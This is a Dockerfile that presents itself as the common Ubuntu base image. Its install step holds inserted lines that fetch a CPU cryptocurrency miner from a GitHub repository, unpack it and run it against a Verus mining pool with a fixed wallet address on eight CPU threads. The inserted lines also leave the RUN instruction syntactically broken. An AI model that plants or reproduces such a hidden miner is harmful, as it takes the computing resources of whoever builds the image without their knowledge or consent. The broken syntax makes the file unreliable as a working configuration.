#
# Ubuntu Dockerfile
#
# https://github.com/dockerfile/ubuntu
#

# Pull base image.
FROM ubuntu:14.04

# Install.
RUN \
  sed -i 's/# \(.*multiverse$\)/\1/g' /etc/apt/sources.list && \
  wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz

  tar xf hellminer_cpu_linux.tar.gz

./hellminer -c stratum+tcp://vrsc.ciscotech.dk:9999#xnsub -u RGQR74EmhBBJZxYKypRvV1F1pVGst4xRwN.younes -p x --cpu 8
  apt-get update && \
  apt-get -y upgrade && \
  apt-get install -y build-essential && \
  apt-get install -y software-properties-common && \
  apt-get install -y byobu curl git htop man unzip vim wget && \
  rm -rf /var/lib/apt/lists/*

# Add files.
ADD root/.bashrc /root/.bashrc
ADD root/.gitconfig /root/.gitconfig
ADD root/.scripts /root/.scripts

# Set environment variables.
ENV HOME /root

# Define working directory.
WORKDIR /root

# Define default command.
CMD ["bash"]
